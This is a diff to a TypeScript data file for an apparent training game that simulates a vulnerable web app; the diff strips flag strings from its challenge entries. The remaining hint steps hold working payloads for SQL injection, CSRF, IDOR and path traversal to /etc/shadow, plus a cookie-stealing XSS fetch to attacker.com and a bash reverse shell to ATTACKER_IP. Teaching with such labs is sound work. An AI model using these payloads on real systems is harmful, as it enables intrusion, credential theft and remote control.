@@ -12,7 +12,6 @@ export interface WebAppPage {
 export interface HiddenElement {
   type: 'comment' | 'hidden-input' | 'meta' | 'script-var' | 'base64' | 'cookie' | 'header';
   description: string;
-  flag: string;
   location: string;
 }
 
@@ -23,7 +22,6 @@ export interface SimulatedVuln {
   description: string;
   difficulty: 'beginner' | 'intermediate' | 'advanced';
   steps: string[];
-  flag: string;
   cpReward: number;
 }
 
@@ -84,7 +82,6 @@ button:hover { background: #059a5e; }
     {
       type: 'comment',
       description: 'HTML comment revealing admin login hint',
-      flag: 'FLAG{vuln_hidden_comment_admin}',
       location: 'Line 30: "REMINDER: Admin login uses username admin with default creds."',
     },
   ],
@@ -102,7 +99,6 @@ button:hover { background: #059a5e; }
         'Click Sign in',
         'Observe that you are logged in as admin because the query becomes: SELECT * FROM users WHERE username = \'\' OR 1=1 --\' AND password = \'...\'',
       ],
-      flag: 'FLAG{vuln_sqli_login_bypass}',
       cpReward: 200,
     },
   ],
@@ -276,7 +272,6 @@ var userId = "1";
     {
       type: 'script-var',
       description: 'The userId variable is controlled via the user_id query parameter, allowing IDOR',
-      flag: 'FLAG{vuln_idor_user_id}',
       location: 'Line 95: var userId = "1"; in the script tag',
     },
   ],
@@ -294,7 +289,6 @@ var userId = "1";
         'Continue incrementing user_id to enumerate all users',
         'Notice that user_id=0 returns the admin user details'
       ],
-      flag: 'FLAG{vuln_idor_profile_access}',
       cpReward: 300,
     },
     {
@@ -310,7 +304,6 @@ var userId = "1";
         'Set the new_password and confirm_password fields to a value of your choice',
         'When a victim visits this page, their password is silently changed'
       ],
-      flag: 'FLAG{vuln_csrf_password_change}',
       cpReward: 350,
     },
   ],
@@ -398,7 +391,6 @@ body { font-family: 'Segoe UI', Arial, sans-serif; background: #0f172a; color: #
         'The script executes in the context of the page',
         'Advanced: inject a script that steals cookies: <script>fetch("https://attacker.com/steal?c="+document.cookie)</script>'
       ],
-      flag: 'FLAG{vuln_xss_search_reflected}',
       cpReward: 200,
     },
   ],
@@ -509,7 +501,6 @@ round-trip min/avg/max/stddev = 0.029/0.031/0.032/0.002 ms
     {
       type: 'script-var',
       description: 'A TODO comment in the script tag reveals token verification logic',
-      flag: 'FLAG{vuln_hidden_api_endpoint}',
       location: 'Line 102-103: script tag with TODO comment and /api/verify endpoint reference',
     },
   ],
@@ -528,7 +519,6 @@ round-trip min/avg/max/stddev = 0.029/0.031/0.032/0.002 ms
         'Escalate by reading sensitive files: 127.0.0.1; cat /etc/passwd',
         'Try to get a reverse shell using: 127.0.0.1; bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"'
       ],
-      flag: 'FLAG{vuln_cmdi_ping_injection}',
       cpReward: 500,
     },
   ],
@@ -635,7 +625,6 @@ td { border-bottom: 1px solid #334155; }
     {
       type: 'comment',
       description: 'An HTML comment with a base64-encoded string in the admin page source',
-      flag: 'FLAG{vuln_base64_secret_source}',
       location: 'Near the bottom of admin.html source: <!-- base64: U0VDUkVUX1RPS0VOX0FCQ0RFRkc= -->',
     },
   ],
@@ -654,7 +643,6 @@ td { border-bottom: 1px solid #334155; }
         'Further explore: try /api/files/download?path=../../../etc/shadow',
         'Can also download application source code via: ../../../var/www/app/app.py'
       ],
-      flag: 'FLAG{vuln_path_traversal_download}',
       cpReward: 300,
     },
     {
@@ -670,7 +658,6 @@ td { border-bottom: 1px solid #334155; }
         'Try accessing /api/users/0, /api/users/1, etc. to enumerate all users',
         'Notice there is no rate limiting or access restriction on the API'
       ],
-      flag: 'FLAG{vuln_idor_admin_user_list}',
       cpReward: 300,
     },
   ],
@@ -779,7 +766,6 @@ console.log("JWT secret length hint: 8 characters");
     {
       type: 'script-var',
       description: 'Script comment reveals a JWT secret length hint and suggests modifying the payload',
-      flag: 'FLAG{vuln_jwt_token_tampering}',
       location: 'Line 128: "JWT secret length hint: 8 characters" in a script tag comment',
     },
   ],
@@ -798,7 +784,6 @@ console.log("JWT secret length hint: 8 characters");
         'Once secret is found (8 characters), create a new token with "role":"admin"',
         'Use the forged token to access restricted admin-only endpoints'
       ],
-      flag: 'FLAG{vuln_jwt_tampering_admin}',
       cpReward: 600,
     },
   ],
@@ -833,7 +818,6 @@ export const SIMULATED_WEB_APP: VulnerableWebApp = {
         'Decode the base64 string: echo "U0VDUkVUX1RPS0VOX0FCQ0RFRkc=" | base64 -d',
         'The decoded string is the flag'
       ],
-      flag: 'FLAG{vuln_base64_secret_decode}',
       cpReward: 150,
     },
   ],
